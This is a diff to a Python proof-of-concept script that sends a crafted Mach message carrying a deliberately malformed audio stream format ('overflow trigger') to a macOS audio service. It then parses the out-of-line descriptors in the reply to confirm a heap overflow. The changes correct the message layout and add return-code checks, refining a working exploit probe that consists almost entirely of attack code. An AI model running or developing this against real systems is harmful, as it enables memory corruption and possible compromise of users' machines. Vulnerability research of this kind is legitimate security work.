@@ -74,6 +74,7 @@ assert len(ASBD_OVERFLOW) == 40, len(ASBD_OVERFLOW)
 buf = bytearray(0x200)
 struct.pack_into('<IIIIII', buf, 0x00,
     SO_BITS, 0x78, svc.value, rp, 0, 0x157c3)
+buf[0x18:0x20] = b'\x00\x00\x00\x00\x01\x00\x00\x00'  # NDR record
 struct.pack_into('<I', buf, 0x20, NC_HNDL)
 buf[0x28:0x50] = ASBD_NORMAL    # ASBD1 = normal
 buf[0x50:0x78] = ASBD_OVERFLOW  # ASBD2 = overflow trigger
@@ -102,18 +103,27 @@ if not is_cmplx:
     print("  0xBF88AEC1 = kAudioUnitErr_InvalidProperty or ASBD rejected")
     print("  0xBF88AECD = kAudioUnitErr_FormatNotSupported")
     print("  Server rejected crafted ASBD — need different format or value")
-
-# Success: check OOL descriptor sizes
-print("SUCCESS — complex reply:")
-for i in range(in_dcnt):
-    off   = 0x1c + i * 16
-    addr  = struct.unpack_from('<Q', buf, off)[0]
-    flags = struct.unpack_from('<I', buf, off + 8)[0]
-    sz    = struct.unpack_from('<I', buf, off + 12)[0]
-    print(f"  OOL[{i}]: addr={hex(addr)} sz={hex(sz)}")
-    if sz == 0x1000:
-        print(f"    *** OVERFLOW CONFIRMED: sz=0x1000 matches crafted result!")
-    if sz >= 0x100000:
-        print(f"    normal-sized allocation (no overflow)")
+else:
+    # Complex reply: OOL descriptors start at 0x1c, stride 16 (64-bit mach_msg_ool_descriptor_t)
+    # Layout: address(8) | size(4) at +8 | flags(4) at +12
+    print("SUCCESS — complex reply:")
+    for i in range(in_dcnt):
+        off   = 0x1c + i * 16
+        addr  = struct.unpack_from('<Q', buf, off)[0]
+        sz    = struct.unpack_from('<I', buf, off + 8)[0]   # size at +8, NOT +12
+        flags = struct.unpack_from('<I', buf, off + 12)[0]  # type/flags at +12
+        desc_type = flags & 0xff
+        print(f"  OOL[{i}]: addr={hex(addr)} sz={hex(sz)} type={desc_type}")
+        if sz == 0x1000:
+            print(f"    *** OVERFLOW CONFIRMED: sz=0x1000 matches crafted result!")
+        if sz >= 0x100000:
+            print(f"    normal-sized allocation (no overflow)")
+    # RetCode lives after all descriptors: NDR(8) + RetCode(4)
+    retcode_off = 0x1c + in_dcnt * 16
+    ndr_off = retcode_off
+    retcode = struct.unpack_from('<i', buf, ndr_off + 8)[0]
+    print(f"  RetCode={retcode:#010x}")
+    if retcode != 0:
+        print(f"  Server-side error despite complex reply: {retcode:#010x}")
 
 print("DONE")
